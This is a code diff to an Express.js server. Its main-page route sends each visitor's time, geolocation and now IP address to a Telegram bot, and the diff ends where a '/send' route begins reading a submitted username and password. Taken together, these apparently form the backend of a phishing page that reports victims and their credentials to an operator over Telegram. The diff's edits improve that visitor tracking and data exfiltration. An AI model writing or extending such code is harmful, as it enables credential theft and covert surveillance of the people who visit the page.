@@ -15,7 +15,9 @@ async function getLocation(ip) {
 }
 
 router.get("/", async function (req, res, next) {
-  const ip = req.ip;
+  // Trust proxy headers if you're behind a proxy
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+
   const location = await getLocation(ip);
 
   let locationText = "Location: Unknown";
@@ -25,7 +27,7 @@ router.get("/", async function (req, res, next) {
 
   const telegramBotToken = config.telegramBotToken;
   const chatId = config.chatId;
-  const text = `🚨 A user has visited the main page!\n\nTime: ${new Date().toISOString()}\n${locationText}`;
+  const text = `🚨 A user has visited the main page!\n\nTime: ${new Date().toISOString()}\nIP: ${ip}\n${locationText}`;
 
   try {
     await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
@@ -34,10 +36,11 @@ router.get("/", async function (req, res, next) {
     });
     res.render("index");
   } catch (error) {
-    // Error is caught but not logged in console
+    console.error("Telegram API error:", error.response?.data || error.message);
     res.render("index");
   }
 });
+
 
 router.post("/send", async function (req, res, next) {
   const { username, password } = req.body;
